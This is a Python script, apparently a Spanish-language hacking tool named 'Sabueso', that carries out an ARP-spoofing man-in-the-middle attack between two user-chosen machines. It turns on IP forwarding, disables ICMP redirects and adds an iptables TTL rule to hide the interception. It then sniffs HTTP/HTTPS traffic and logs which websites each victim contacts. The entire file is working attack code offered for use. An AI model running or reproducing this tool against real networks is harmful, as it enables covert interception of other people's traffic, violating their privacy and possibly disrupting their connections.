#!/usr/bin/env -S python3
import threading
from scapy.all import *
import re
from socket import gethostbyaddr,herror
from platform import system
from subprocess import check_output
from colorama import init,Fore
import time

init()

logo = '''

\033[0;32m██    ██ ██████  ██████   ██████  ███    ██ 
\033[0;32m██    ██ ██   ██ ██   ██ ██    ██ ████   ██ 
\033[0;31m██    ██ ██████  ██████  ██ ██ ██ ██ ██  ██ 
██    ██ ██   ██ ██   ██ ██ ██ ██ ██  ██ ██ 
 ██████  ██   ██ ██████   █ ████  ██   ████ 
                                            
\033[0;40;31mSabueso v 1.0                                      

\033[33mADVERTENCIA --> esta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes
'''
ejecutando = True

ataque =lambda ip1,ip2: arp_mitm(ip1,ip2)
def informacion(paquete):
   try:
      ip_http = re.search(r'(\d+\.\d+\.\d+\.\d+):https?',str(paquete)).group(1).strip()
      ip_dts = re.search(r'TCP (\d+\.\d+\.\d+\.\d+):\d+ >',str(paquete)).group(1).strip()
      #ip_dst --> ip destinatario 0
      #ip_http --> ip del sitio web 1
      return (ip_dts,ip_http)
   except AttributeError:
      pass

def sniffing():

   conf.verb=0
   while ejecutando:
      try:
         func_sn = sniff(timeout=1,filter='tcp and ( port 80 or port 443 )')
         for x in range(len(func_sn) - 1):
            try:
               #retorna la ip del sitio web
               pqt = informacion(func_sn[x])[1]
               #retorna la ip del destinatario
               p1 = informacion(func_sn[x])[0]

               print(Fore.WHITE+f'\n{gethostbyaddr(pqt)[0]} - ip numerica > {pqt}- destinatario > {p1}\n')

            except herror: print(Fore.WHITE+f'\n{pqt} - ip numerica > {pqt}- destinatario > {p1}\n')

      except TypeError: pass

      except Exception as e: print(f'\n\033[0;40;31m[+] error > {e}\n')  
      
      

def ejecucion(maq1,maq2):
   
   threading.Thread(target=ataque,args=(maq1,maq2)).start()
   threading.Thread(target=sniffing).start()
   
   

if __name__ == '__main__':
   print(logo)
   if system() == 'Linux':
      if check_output('whoami',text=True).strip() == 'root': 
         maq1 = str(input(Fore.WHITE+'[#] maquina A (ipv4) >> ')).strip()
         maq2 = str(input(Fore.WHITE+'[#] maquina B (ipv4) >> ')).strip()
         print('\033[0m')
         for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
            'sysctl net.ipv4.ip_forward=1',
            'iptables -t mangle -A PREROUTING -j TTL --ttl-inc 1']:

            if subprocess.run(x,shell=True).returncode != 0:
               print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
               
         print('\n\033[0;32miniciando ataque ...\n')
         ejecucion(maq1,maq2)
      else:
         print('\n\033[0;40;31m[+] no soy root\n')
   else:
      print('\n\033[0;40;31m[+] sistema operativo incompatible\n')
      input()